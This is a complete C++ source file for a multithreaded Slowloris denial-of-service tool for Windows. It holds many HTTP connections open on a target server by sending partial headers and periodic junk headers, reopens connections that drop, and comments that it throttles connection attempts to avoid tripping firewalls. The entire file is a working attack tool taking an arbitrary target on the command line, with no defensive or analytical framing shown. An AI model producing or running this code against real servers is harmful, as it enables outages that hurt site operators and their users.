#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <vector>
#include <string>
#include <iostream>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")

void slowloris_worker(const std::string& host, const std::string& resolved_ip, int port, int num_sockets, int duration_sec) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    std::vector<SOCKET> sockets;

    // Open all connections and send partial headers
    for (int i = 0; i < num_sockets; i++) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) continue;

        // Set TCP timeout so we don't hang forever
        DWORD timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

        sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, resolved_ip.c_str(), &target.sin_addr);

        if (connect(sock, (sockaddr*)&target, sizeof(target)) != 0) {
            closesocket(sock);
            continue;
        }

        // Send partial HTTP headers — never send the final \r\n
        std::string partial = "GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n";
        send(sock, partial.c_str(), partial.length(), 0);

        sockets.push_back(sock);

        // Small delay between connections so we don't flood SYN and trip firewalls
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    std::cout << "[Thread " << GetCurrentThreadId() << "] Opened " << sockets.size() << " connections\n";

    ULONGLONG end_time = GetTickCount64() + (duration_sec * 1000);

    // Keep connections alive by sending garbage headers every few seconds
    int counter = 0;
    while (GetTickCount64() < end_time) {
        for (size_t i = 0; i < sockets.size(); i++) {
            if (sockets[i] == INVALID_SOCKET) continue;

            std::string keepalive = "X-" + std::to_string(counter) + ": " + std::to_string(i) + "\r\n";
            int result = send(sockets[i], keepalive.c_str(), keepalive.length(), 0);

            if (result == SOCKET_ERROR) {
                // Connection dead — reopen it
                closesocket(sockets[i]);
                sockets[i] = INVALID_SOCKET;

                SOCKET newsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (newsock == INVALID_SOCKET) continue;

                sockaddr_in target;
                target.sin_family = AF_INET;
                target.sin_port = htons(port);
                inet_pton(AF_INET, resolved_ip.c_str(), &target.sin_addr);

                if (connect(newsock, (sockaddr*)&target, sizeof(target)) == 0) {
                    DWORD timeout = 5000;
                    setsockopt(newsock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
                    setsockopt(newsock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

                    std::string partial = "GET / HTTP/1.1\r\nHost: " + host + "\r\n";
                    send(newsock, partial.c_str(), partial.length(), 0);
                    sockets[i] = newsock;
                }
            }
        }

        counter++;
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    for (auto& sock : sockets) {
        if (sock != INVALID_SOCKET) closesocket(sock);
    }

    WSACleanup();
}

int main(int argc, char* argv[]) {
    if (argc < 6) {
        std::cout << "Usage: " << argv[0] << " <url or ip> <port> <duration_sec> <threads> <sockets_per_thread>\n";
        std::cout << "Example: " << argv[0] << " example.com 80 300 4 100\n";
        return 1;
    }

    std::string host = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    int sockets_per_thread = atoi(argv[5]);

    // Strip http:// or https://
    if (host.rfind("http://", 0) == 0) host = host.substr(7);
    if (host.rfind("https://", 0) == 0) host = host.substr(8);

    // Strip trailing path
    size_t slash = host.find('/');
    if (slash != std::string::npos) host = host.substr(0, slash);

    // Strip embedded port
    size_t colon = host.rfind(':');
    if (colon != std::string::npos) host = host.substr(0, colon);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // Resolve hostname
    addrinfo hints = {};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    addrinfo* result = nullptr;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0 || !result) {
        std::cout << "Failed to resolve host: " << host << "\n";
        WSACleanup();
        return 1;
    }

    char resolved_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &((sockaddr_in*)result->ai_addr)->sin_addr, resolved_ip, sizeof(resolved_ip));
    std::cout << "Resolved " << host << " -> " << resolved_ip << "\n";

    freeaddrinfo(result);
    WSACleanup();

    std::cout << "Starting slowloris: " << num_threads << " threads x " << sockets_per_thread << " sockets\n";
    std::cout << "Total connections: " << (num_threads * sockets_per_thread) << "\n";
    std::cout << "Duration: " << duration << " seconds\n\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < num_threads; i++) {
        threads.push_back(std::thread(slowloris_worker, host, resolved_ip, port, sockets_per_thread, duration));
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "\nDone.\n";
    return 0;
}
